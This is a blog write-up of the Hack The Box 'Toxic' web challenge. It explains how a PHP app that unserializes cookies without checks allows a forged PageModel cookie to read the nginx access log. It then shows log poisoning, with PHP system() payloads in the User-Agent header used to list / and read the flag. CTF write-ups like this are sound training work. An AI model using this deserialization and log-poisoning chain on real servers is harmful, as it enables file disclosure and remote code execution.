<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="HTB Toxic(Challenge) Writeup" /><meta name="author" content="Cerberus" /><meta property="og:locale" content="en" /><meta name="description" content="web/Toxic" /><meta property="og:description" content="web/Toxic" /><link rel="canonical" href="https://gmvivekanandan.github.io/posts/HTB-TOXIC-CHALLENGE/" /><meta property="og:url" content="https://gmvivekanandan.github.io/posts/HTB-TOXIC-CHALLENGE/" /><meta property="og:site_name" content="Cerberus" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-02-26T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HTB Toxic(Challenge) Writeup" /><meta name="twitter:site" content="@3Cerberus_tm" /><meta name="twitter:creator" content="@3Cerberus_tm" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Cerberus","url":"https://github.com/gmvivekanandan"},"dateModified":"2023-02-26T16:14:37+00:00","datePublished":"2023-02-26T00:00:00+00:00","description":"web/Toxic","headline":"HTB Toxic(Challenge) Writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://gmvivekanandan.github.io/posts/HTB-TOXIC-CHALLENGE/"},"url":"https://gmvivekanandan.github.io/posts/HTB-TOXIC-CHALLENGE/"}</script><title>HTB Toxic(Challenge) Writeup | Cerberus</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Cerberus"><meta name="application-name" content="Cerberus"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/DP-01.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Cerberus</a></div><div class="site-subtitle font-italic">Welcome to my blog.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/gmvivekanandan" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/3Cerberus_tm" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmvivekanandan.dev','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>HTB Toxic(Challenge) Writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>HTB Toxic(Challenge) Writeup</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1677369600" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 26, 2023 </em> </span> <span> Updated <em class="" data-ts="1677428077" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Feb 26, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/gmvivekanandan">Cerberus</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="917 words"> <em>5 min</em> read</span></div></div></div><div class="post-content"><h2 id="webtoxic"><span class="mr-2">web/Toxic</span><a href="#webtoxic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><strong>Description: Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. üê∏</strong></p><p><a href="https://app.hackthebox.com/challenges/Toxic">zip file</a> <em>*Login to Download</em></p><h4 id="indexphp"><span class="mr-2">index.php</span><a href="#indexphp" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nb">spl_autoload_register</span><span class="p">(</span><span class="k">function</span> <span class="p">(</span><span class="nv">$name</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/Model$/'</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="nv">$name</span> <span class="o">=</span> <span class="s2">"models/${name}"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">include_once</span> <span class="s2">"${name}.php"</span><span class="p">;</span>
<span class="p">});</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">empty</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]))</span>
<span class="p">{</span>
    <span class="nv">$page</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PageModel</span><span class="p">;</span>
    <span class="nv">$page</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="s1">'/www/index.html'</span><span class="p">;</span>

    <span class="nb">setcookie</span><span class="p">(</span>
        <span class="s1">'PHPSESSID'</span><span class="p">,</span> 
        <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$page</span><span class="p">)),</span> 
        <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">60</span><span class="o">*</span><span class="mi">60</span><span class="o">*</span><span class="mi">24</span><span class="p">,</span> 
        <span class="s1">'/'</span>
    <span class="p">);</span>
<span class="p">}</span> 

<span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">'PHPSESSID'</span><span class="p">]);</span>
<span class="nb">unserialize</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">);</span>
</pre></table></code></div></div><p>A few pointers to note in this file</p><ul><li><p>If the <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie is empty, a new <strong>PageModel</strong> object is created and a file attribute is set pointing to <em>/www/index.html</em>. It is then serialized and base64 encoded and set in a cookie.</p><li><p>If the <code class="language-plaintext highlighter-rouge">PHPSESSID</code> cookie is present, it is simply base64 decoded and unserialized.</p></ul><h3 id="initial-steps"><span class="mr-2">Initial Steps</span><a href="#initial-steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>My initial thoughts were to base64 decode and unserialize the cookie and change the file object to read the flag located in <code class="language-plaintext highlighter-rouge">/flag</code>. So I took the initial cookie and base64 decoded and unserialized it. It gave me and object which looked like this</p><blockquote><p>O:9:‚ÄùPageModel‚Äù:1:{s:4:‚Äùfile‚Äù;s:15:‚Äù/www/index.html‚Äù;}.</p></blockquote><p>More info about how serializing and deserializing works can be found at <a href="https://redfoxsec.com/blog/insecure-deserialization-in-php/">Insecure Deserialization in PHP</a>. I tried to change the file to point to <code class="language-plaintext highlighter-rouge">/flag</code> directory, but seems like there was no flag. On looking closer at other files, there was an <code class="language-plaintext highlighter-rouge">entrypoint.sh</code> file.</p><h4 id="entrypointsh"><span class="mr-2">entrypoint.sh</span><a href="#entrypointsh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c">#!/bin/ash</span>

<span class="c"># Secure entrypoint</span>
<span class="nb">chmod </span>600 /entrypoint.sh

<span class="c"># Generate random flag filename</span>
<span class="nb">mv</span> /flag /flag_<span class="sb">`</span><span class="nb">cat</span> /dev/urandom | <span class="nb">tr</span> <span class="nt">-dc</span> <span class="s1">'a-zA-Z0-9'</span> | <span class="nb">fold</span> <span class="nt">-w</span> 5 | <span class="nb">head</span> <span class="nt">-n</span> 1<span class="sb">`</span>

<span class="nb">exec</span> <span class="s2">"</span><span class="nv">$@</span><span class="s2">"</span>
</pre></table></code></div></div><p>It seems a new random directory for flag is created each time a new instance is spun. So we need to know the exact folder name to read the flag. I decided to look into other files in the folder.</p><h3 id="analyzing-nginxconf"><span class="mr-2">Analyzing nginx.conf</span><a href="#analyzing-nginxconf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="the-folder-structure"><span class="mr-2">The folder structure</span><a href="#the-folder-structure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="nb">.</span>
‚îú‚îÄ‚îÄ build-docker.sh
‚îú‚îÄ‚îÄ challenge
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ index.html
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ index.php
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ models
‚îÇ¬†¬† ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ PageModel.php
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ static
‚îÇ¬†¬†     ‚îú‚îÄ‚îÄ basement
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ help.png
‚îÇ¬†¬†     ‚îú‚îÄ‚îÄ css
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ production.css
‚îÇ¬†¬†     ‚îú‚îÄ‚îÄ images
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ aircraft.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ bucket.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ dart-frog.jpg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ drift.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ facebook.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ favicon.ico
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ flask.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ instagram.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ logo.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ newrelic.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ presentor.jpg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ryan1.png
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ryan2.png
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ryan3.png
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ryan4.png
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ryan5.png
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ ryan6.png
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ segment.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ stripe.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ twitter.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ woman1.jpg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ woman2.jpg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ woman3.jpg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îú‚îÄ‚îÄ youtube.svg
‚îÇ¬†¬†     ‚îÇ¬†¬† ‚îî‚îÄ‚îÄ zopim.svg
‚îÇ¬†¬†     ‚îî‚îÄ‚îÄ js
‚îÇ¬†¬†         ‚îî‚îÄ‚îÄ production.js
‚îú‚îÄ‚îÄ config
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ fpm.conf
‚îÇ¬†¬† ‚îú‚îÄ‚îÄ nginx.conf
‚îÇ¬†¬† ‚îî‚îÄ‚îÄ supervisord.conf
‚îú‚îÄ‚îÄ Dockerfile
‚îú‚îÄ‚îÄ entrypoint.sh
‚îî‚îÄ‚îÄ flag
</pre></table></code></div></div><p>The file that stood out was <em>nginx.conf</em>. I decided to give that file a look.</p><h4 id="nginxconf"><span class="mr-2">nginx.conf</span><a href="#nginxconf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-nginx highlighter-rouge"><div class="code-header"> <span data-label-text="Nginx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="k">user</span> <span class="s">www</span><span class="p">;</span>
<span class="k">pid</span> <span class="n">/run/nginx.pid</span><span class="p">;</span>
<span class="k">error_log</span> <span class="n">/dev/stderr</span> <span class="s">info</span><span class="p">;</span>

<span class="k">events</span> <span class="p">{</span>
    <span class="kn">worker_connections</span> <span class="mi">1024</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">http</span> <span class="p">{</span>
    <span class="kn">server_tokens</span> <span class="no">off</span><span class="p">;</span>
    <span class="kn">log_format</span> <span class="s">docker</span> <span class="s">'</span><span class="nv">$remote_addr</span> <span class="nv">$remote_user</span> <span class="nv">$status</span> <span class="s">"</span><span class="nv">$request</span><span class="s">"</span> <span class="s">"</span><span class="nv">$http_referer</span><span class="s">"</span> <span class="s">"</span><span class="nv">$http_user_agent</span><span class="s">"</span> <span class="s">'</span><span class="p">;</span>
    <span class="kn">access_log</span> <span class="n">/var/log/nginx/access.log</span> <span class="s">docker</span><span class="p">;</span>

    <span class="kn">charset</span> <span class="s">utf-8</span><span class="p">;</span>
    <span class="kn">keepalive_timeout</span> <span class="s">20s</span><span class="p">;</span>
    <span class="kn">sendfile</span> <span class="no">on</span><span class="p">;</span>
    <span class="kn">tcp_nopush</span> <span class="no">on</span><span class="p">;</span>
    <span class="kn">client_max_body_size</span> <span class="mi">1M</span><span class="p">;</span>

    <span class="kn">include</span>  <span class="n">/etc/nginx/mime.types</span><span class="p">;</span>

    <span class="kn">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="mi">80</span><span class="p">;</span>
        <span class="kn">server_name</span> <span class="s">_</span><span class="p">;</span>

        <span class="kn">index</span> <span class="s">index.php</span><span class="p">;</span>
        <span class="kn">root</span> <span class="n">/www</span><span class="p">;</span>

        <span class="kn">location</span> <span class="n">/</span> <span class="p">{</span>
            <span class="kn">try_files</span> <span class="nv">$uri</span> <span class="nv">$uri</span><span class="n">/</span> <span class="n">/index.php?</span><span class="nv">$query_string</span><span class="p">;</span>
            <span class="kn">location</span> <span class="p">~</span> <span class="sr">\.php$</span> <span class="p">{</span>
                <span class="kn">try_files</span> <span class="nv">$uri</span> <span class="p">=</span><span class="mi">404</span><span class="p">;</span>
                <span class="kn">fastcgi_pass</span> <span class="s">unix:/run/php-fpm.sock</span><span class="p">;</span>
                <span class="kn">fastcgi_index</span> <span class="s">index.php</span><span class="p">;</span>
                <span class="kn">fastcgi_param</span> <span class="s">SCRIPT_FILENAME</span> <span class="nv">$document_root$fastcgi_script_name</span><span class="p">;</span>
                <span class="kn">include</span> <span class="s">fastcgi_params</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The first thing that caught my attention was the <code class="language-plaintext highlighter-rouge">access_log</code>, that describes where the logs were stored. Next thing is I wrote a simple PHP script that would create the <strong>PageModel</strong> object with file pointing to <code class="language-plaintext highlighter-rouge">/var/log/nginx/access.log</code>.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="kd">class</span> <span class="nc">PageModel</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$file</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$page</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PageModel</span><span class="p">;</span>
<span class="nv">$page</span><span class="o">-&gt;</span><span class="n">file</span> <span class="o">=</span> <span class="s1">'/var/log/nginx/access.log'</span><span class="p">;</span>
<span class="k">print</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$page</span><span class="p">)))</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>After updating the cookie and refreshing the page, we are presented with the contents of <em>access.log</em> file.</p><p><img data-src="/assets/img/toxic/toxic.png" alt="Contents ofvar/log/nginx/access.log" data-proofer-ignore> <em>Contents of /var/log/nginx/access.log</em></p><h3 id="the-final-steps"><span class="mr-2">The Final Steps</span><a href="#the-final-steps" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Next thing we could see is how the log is formatted before it is inserted into the log file. The following line shows the configuration.</p><blockquote><p>log_format docker ‚Äò$remote_addr $remote_user $status ‚Äú$request‚Äù ‚Äú$http_referer‚Äù ‚Äú$http_user_agent‚Äù ‚Äò;<br /> access_log /var/log/nginx/access.log docker;</p></blockquote><p>We could see the user agent being inserted in the log, which is something an user could control. After a few hours of research and after many attempts of trail and error, I came to know about log poisoning. Considering the application is a PHP application we could try to insert some arbitrary PHP code in the user-agent header and check if it gets executed. Inserting this line of code in the header produces the following result.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'ls -l /'</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/img/toxic/toxic1.png" alt="Contents ofvar/log/nginx/access.log with contents of folder" data-proofer-ignore> <em>Contents of /var/log/nginx/access.log with contents of / folder</em></p><p>Now since we have the flag folder we could insert another PHP payload in the user-agent header and read the flag.</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">'cat /flag_H3zzM'</span><span class="p">);</span><span class="cp">?&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/img/toxic/toxic2.png" alt="Contents ofvar/log/nginx/access.log with flag" data-proofer-ignore> <em>Contents of /var/log/nginx/access.log with flag</em></p><p><strong>Flag: HTB{P0i5on_1n_Cyb3r_W4rF4R3?!}</strong></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/writeups/'>writeups</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/rce/" class="post-tag no-text-decoration" >RCE</a> <a href="/tags/php/" class="post-tag no-text-decoration" >PHP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB+Toxic%28Challenge%29+Writeup+-+Cerberus&url=https%3A%2F%2Fgmvivekanandan.github.io%2Fposts%2FHTB-TOXIC-CHALLENGE%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB+Toxic%28Challenge%29+Writeup+-+Cerberus&u=https%3A%2F%2Fgmvivekanandan.github.io%2Fposts%2FHTB-TOXIC-CHALLENGE%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fgmvivekanandan.github.io%2Fposts%2FHTB-TOXIC-CHALLENGE%2F&text=HTB+Toxic%28Challenge%29+Writeup+-+Cerberus" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-TOXIC-CHALLENGE/">HTB Toxic(Challenge) Writeup</a><li><a href="/posts/DICE-CTF-@HOPE/">DICE CTF@HOPE 2022</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/python/">python</a> <a class="post-tag" href="/tags/pyjail/">pyjail</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/git/">git</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/DICE-CTF-@HOPE/"><div class="card-body"> <em class="small" data-ts="1658793600" data-df="ll" > Jul 26, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DICE CTF@HOPE 2022</h3><div class="text-muted small"><p> rev/slices Description: Have a slice Given python file flag = input(&#39;Enter flag: &#39;) def fail(): print(&#39;Wrong!&#39;) exit(-1) if len(flag) != 32: fail() if flag[:5] != &#39;hope{&#39;: fail() if f...</p></div></div></a></div><div class="card"> 